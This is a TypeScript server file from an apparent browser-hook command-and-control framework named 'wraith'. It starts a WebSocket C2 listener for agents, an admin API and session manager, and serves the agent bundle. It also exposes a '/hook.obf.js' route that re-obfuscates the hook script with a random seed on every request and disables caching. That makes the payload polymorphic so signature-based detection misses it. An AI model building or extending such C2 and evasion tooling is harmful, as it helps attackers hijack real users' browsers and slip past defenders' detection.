import Fastify from 'fastify'
import cors from '@fastify/cors'
import staticPlugin from '@fastify/static'
import websocketPlugin from '@fastify/websocket'
import path from 'path'
import fs from 'fs'
import { fileURLToPath } from 'url'
import JavaScriptObfuscator from 'javascript-obfuscator'
import { getDb } from './db/index.js'
import { defaultEncoder } from './encoding/index.js'
import { WebSocketC2Transport } from './transport/websocket.js'
import { SessionManager } from './sessions/manager.js'
import { registerRoutes } from './api/routes.js'
import { registry } from './modules/registry.js'
import type { AdminMessage } from '@wraith/types'

const __dirname = path.dirname(fileURLToPath(import.meta.url))

const AGENT_WS_PORT  = Number(process.env.AGENT_WS_PORT  ?? 3001)
const HTTP_PORT      = Number(process.env.HTTP_PORT       ?? 3000)

export async function createServer() {
  getDb()  // initialise DB and run schema migrations

  // ── Agent WebSocket transport (separate port, no HTTP overhead) ───────────
  const transport = new WebSocketC2Transport(defaultEncoder)
  await transport.listen(AGENT_WS_PORT)
  console.log(`[wraith] agent WS listening on :${AGENT_WS_PORT}`)

  // ── Session manager ───────────────────────────────────────────────────────
  // Deferred broadcaster: registerRoutes creates adminClients and returns the
  // real function; we wire it after registration to avoid a circular dependency.
  let broadcast: (msg: AdminMessage) => void = () => {}
  const sessions = new SessionManager(transport, msg => broadcast(msg), registry)

  // ── Fastify HTTP + admin WS ───────────────────────────────────────────────
  const app = Fastify({ logger: false })

  await app.register(cors, { origin: true })
  await app.register(websocketPlugin)

  // Serve compiled agent bundle
  const agentDist = path.join(__dirname, '../../agent/dist')
  await app.register(staticPlugin, {
    root:   agentDist,
    prefix: '/',
    decorateReply: false,
  })

  // ── Obfuscated agent bundle (polymorphic — fresh output per request) ──────
  const hookPath = path.join(agentDist, 'hook.js')
  app.get('/hook.obf.js', async (_req, reply) => {
    if (!fs.existsSync(hookPath)) {
      return reply.code(404).send('hook.js not found — run pnpm build:agent')
    }
    const source = fs.readFileSync(hookPath, 'utf-8')
    // Strip the banner comment so the obfuscator doesn't choke on it
    const code = source.replace(/^\/\*\*[\s\S]*?\*\/\s*/, '')
    const result = JavaScriptObfuscator.obfuscate(code, {
      compact:                    true,
      controlFlowFlattening:      true,
      controlFlowFlatteningThreshold: 0.5,
      deadCodeInjection:          true,
      deadCodeInjectionThreshold: 0.2,
      stringArray:                true,
      stringArrayRotate:          true,
      stringArrayShuffle:         true,
      stringArrayEncoding:        ['base64'],
      stringArrayThreshold:       0.75,
      splitStrings:               true,
      splitStringsChunkLength:    5,
      identifierNamesGenerator:   'hexadecimal',
      renameGlobals:              false,
      selfDefending:              false,
      target:                     'browser',
      seed:                       0,  // 0 = random seed each invocation
    })
    reply
      .header('content-type', 'application/javascript; charset=utf-8')
      .header('cache-control', 'no-store')
      .send(result.getObfuscatedCode())
  })

  broadcast = await registerRoutes(app, sessions)

  await app.listen({ port: HTTP_PORT, host: '0.0.0.0' })
  console.log(`[wraith] HTTP + admin WS listening on :${HTTP_PORT}`)

  return { app, transport, sessions }
}
